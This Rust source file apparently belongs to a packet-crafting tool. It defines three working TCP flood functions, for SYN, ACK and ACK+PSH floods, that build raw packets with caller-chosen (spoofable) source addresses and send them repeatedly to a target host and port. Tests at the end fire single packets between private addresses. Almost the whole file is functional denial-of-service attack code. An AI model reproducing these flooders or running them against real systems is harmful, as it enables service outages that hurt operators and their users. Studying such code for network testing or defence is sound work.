use anyhow::Result;
use pnet::packet::tcp::{ipv4_checksum, MutableTcpPacket, TcpFlags};
use rand::Rng;
use std::net::Ipv4Addr;

use crate::utils::return_layer4_tcp_channel;
use crate::utils::TCP_BUFF_SIZE;
use crate::utils::TCP_DATA_LEN;
use crate::utils::TCP_HEADER_LEN;

pub fn send_syn_flood_packet(
    src_ipv4: Ipv4Addr,
    src_port: u16,
    dst_ipv4: Ipv4Addr,
    dst_port: u16,
    max_same_packet: usize,
) -> Result<()> {
    let (mut tcp_tx, _) = return_layer4_tcp_channel(TCP_BUFF_SIZE)?;

    // tcp header
    let mut rng = rand::thread_rng();
    let mut tcp_buff = [0u8; TCP_HEADER_LEN + TCP_DATA_LEN];
    let mut tcp_header = MutableTcpPacket::new(&mut tcp_buff[..]).unwrap();
    tcp_header.set_source(src_port);
    tcp_header.set_destination(dst_port);
    tcp_header.set_sequence(rng.gen());
    tcp_header.set_acknowledgement(rng.gen());
    tcp_header.set_reserved(0);
    tcp_header.set_flags(TcpFlags::SYN);
    tcp_header.set_urgent_ptr(0);
    tcp_header.set_window(1024);
    tcp_header.set_data_offset(5);
    let checksum = ipv4_checksum(&tcp_header.to_immutable(), &src_ipv4, &dst_ipv4);
    tcp_header.set_checksum(checksum);

    for _ in 0..max_same_packet {
        match tcp_tx.send_to(&tcp_header, dst_ipv4.into()) {
            _ => (),
        }
    }
    Ok(())
}

pub fn send_ack_flood_packet(
    src_ipv4: Ipv4Addr,
    src_port: u16,
    dst_ipv4: Ipv4Addr,
    dst_port: u16,
    max_same_packet: usize,
) -> Result<()> {
    let (mut tcp_tx, _) = return_layer4_tcp_channel(TCP_BUFF_SIZE)?;

    // tcp header
    let mut rng = rand::thread_rng();
    let mut tcp_buff = [0u8; TCP_HEADER_LEN + TCP_DATA_LEN];
    let mut tcp_header = MutableTcpPacket::new(&mut tcp_buff[..]).unwrap();
    tcp_header.set_source(src_port);
    tcp_header.set_destination(dst_port);
    tcp_header.set_sequence(rng.gen());
    tcp_header.set_acknowledgement(rng.gen());
    tcp_header.set_reserved(0);
    tcp_header.set_flags(TcpFlags::ACK);
    tcp_header.set_urgent_ptr(0);
    tcp_header.set_window(1024);
    tcp_header.set_data_offset(5);
    let checksum = ipv4_checksum(&tcp_header.to_immutable(), &src_ipv4, &dst_ipv4);
    tcp_header.set_checksum(checksum);

    for _ in 0..max_same_packet {
        match tcp_tx.send_to(&tcp_header, dst_ipv4.into()) {
            _ => (),
        }
    }
    Ok(())
}

pub fn send_ack_psh_flood_packet(
    src_ipv4: Ipv4Addr,
    src_port: u16,
    dst_ipv4: Ipv4Addr,
    dst_port: u16,
    max_same_packet: usize,
) -> Result<()> {
    let (mut tcp_tx, _) = return_layer4_tcp_channel(TCP_BUFF_SIZE)?;

    // tcp header
    let mut rng = rand::thread_rng();
    let mut tcp_buff = [0u8; TCP_HEADER_LEN + TCP_DATA_LEN];
    let mut tcp_header = MutableTcpPacket::new(&mut tcp_buff[..]).unwrap();
    tcp_header.set_source(src_port);
    tcp_header.set_destination(dst_port);
    tcp_header.set_sequence(rng.gen());
    tcp_header.set_acknowledgement(rng.gen());
    tcp_header.set_reserved(0);
    tcp_header.set_flags(TcpFlags::ACK | TcpFlags::PSH);
    tcp_header.set_urgent_ptr(0);
    tcp_header.set_window(1024);
    tcp_header.set_data_offset(5);
    let checksum = ipv4_checksum(&tcp_header.to_immutable(), &src_ipv4, &dst_ipv4);
    tcp_header.set_checksum(checksum);

    for _ in 0..max_same_packet {
        match tcp_tx.send_to(&tcp_header, dst_ipv4.into()) {
            _ => (),
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn test_syn_flood_packet() {
        let src_ipv4 = Ipv4Addr::new(192, 168, 213, 129);
        let dst_ipv4 = Ipv4Addr::new(192, 168, 213, 128);
        let ret = send_syn_flood_packet(src_ipv4, 8888, dst_ipv4, 80, 1).unwrap();
        println!("{:?}", ret);
    }
    #[test]
    fn test_ack_flood_packet() {
        let src_ipv4 = Ipv4Addr::new(192, 168, 213, 129);
        let dst_ipv4 = Ipv4Addr::new(192, 168, 213, 128);
        let ret = send_ack_flood_packet(src_ipv4, 8888, dst_ipv4, 80, 1).unwrap();
        println!("{:?}", ret);
    }
}
